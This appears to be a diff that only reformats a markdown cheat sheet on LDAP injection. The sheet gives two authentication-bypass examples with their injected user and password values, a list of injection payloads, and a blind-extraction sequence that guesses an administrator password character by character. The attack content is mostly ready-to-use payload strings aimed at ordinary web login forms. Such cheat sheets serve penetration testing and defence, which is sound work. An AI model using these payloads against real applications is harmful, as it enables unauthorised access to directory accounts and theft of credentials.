@@ -1,24 +1,28 @@
 # LDAP injection
+
 LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.
 
 ## Exploitation
+
 Example 1.
-```
+
+```sql
 user  = *)(uid=*))(|(uid=*
 pass  = password
 query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
 ```
 
 Example 2
-```
+
+```sql
 user  = admin)(!(&(1=0
 pass  = q))
 query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
 ```
 
-
 ## Payloads
-```
+
+```text
 *
 *)(&
 *))%00
@@ -41,8 +45,10 @@ x' or name()='username' or 'x'='y
 ```
 
 ## Blind Exploitation
+
 We can extract using a bypass login
-```
+
+```sql
 (&(sn=administrator)(password=*))    : OK
 (&(sn=administrator)(password=A*))   : KO
 (&(sn=administrator)(password=B*))   : KO
@@ -61,5 +67,6 @@ We can extract using a bypass login
 ```
 
 ## Thanks to
+
 * [OWASP LDAP Injection](https://www.owasp.org/index.php/LDAP_injection)
 * [LDAP Blind Explorer](http://code.google.com/p/ldap-blind-explorer/)
